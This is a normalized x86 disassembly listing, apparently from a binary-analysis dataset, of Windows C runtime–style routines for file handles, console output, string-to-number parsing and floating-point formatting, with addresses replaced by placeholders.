movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_10026935
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_10017e85
mov [ eax ] 0x9
call sub_10017e98
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_100269bb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_10017e98
and [ eax ] 0x0
call sub_10017e85
mov [ eax ] 0x9
call sub_10017e98
and [ eax ] 0x0
call sub_10017e85
mov [ eax ] 0x9
call sub_1001b8e4
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_10026a24
push 0xc
push r--data
call sub_1001de70
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_1001fd54
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_1001deb5
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10026aba
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_10026ac3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10026aea
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_1002806d
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_10026b2c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_100176e6
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_100229ce
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_10017e85
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10026c5c
push 0x10
push r--data
call sub_1001de70
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_1001fd54
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10026cef
mov eax [ ebp - 0x1c ]
call sub_1001deb5
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_10028110
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_1001750d
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_10026cf8
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_10023a80
pop ecx
push eax
call sub_10023758
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_10026d60
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_10026cf8
pop ecx
test eax eax
je r-xdata
push esi
call sub_10026da8
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_10023a80
push eax
call sub_10028184
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_10026da8
push 0x14
push r--data
call sub_1001de70
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_1001fd54
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10026e79
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_1001deb5
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_100239e3
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_10026e4a
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_10026d60
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_10026d60
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_10026e8b
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_100176e6
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_10021dec
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_10017e85
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_100270b6
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_10026e8b
add esp 0x14
pop ebp
retn
sub_100270f0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_10027151
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx eax [ ebp + 0x10 ]
movzx edx [ ebp + 0x10 ]
mov ecx 0x8000
and eax ecx
push ebx
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
lea eax [ ecx - 0x1 ]
push esi
and edx eax
cmp [ ebp - 0x60 ] 0x0
push edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x30 ] 0xcccccccc
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x74 ] 0x1
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
mov eax esi
shr eax 0x18
shr ebx 0x8
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
mov [ ebp - 0x20 ] cx
movsx ebx ax
mov ecx rw-data
sub ecx 0x60
neg ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x68 ] ecx
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp ecx eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
test ebx ebx
jns r-xdata
test ecx 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x60 ] cx
mov [ ebx ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x3001
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
mov ebx [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx ax
jae r-xdata
je r-xdata
mov eax rw-data
sub eax 0x60
neg ebx
mov [ ebp - 0x68 ] eax
test ebx ebx
xor edx edx
cmp [ ebp - 0x60 ] dx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
sar ebx 0x3
and ecx 0x7
je r-xdata
cmp ecx eax
jne r-xdata
cmp ecx 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_1001b438
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x60 ] ax
mov [ edx + 0x3 ] 0x3001
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1001b892
mov [ ebx + 0x3 ] 0x6
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jns r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa ]
mov edx ecx
xor edx [ ebp - 0x16 ]
mov esi 0x7fff
and edx 0x8000
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x16 ]
and edx esi
and ecx esi
lea esi [ ecx + edx ]
movzx edi si
mov esi 0x7fff
cmp dx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x58 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp cx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_1001b438
add esp 0xc
test eax eax
jne r-xdata
mov al [ ebx - 0x1 ]
sub ebx 0x2
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x54 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
add edi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x58 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x48 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp cx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x60 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jns r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x58 ] 0x2
add eax 0x2
dec [ ebp - 0x48 ]
cmp [ ebp - 0x48 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x54 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x58 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
add esi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
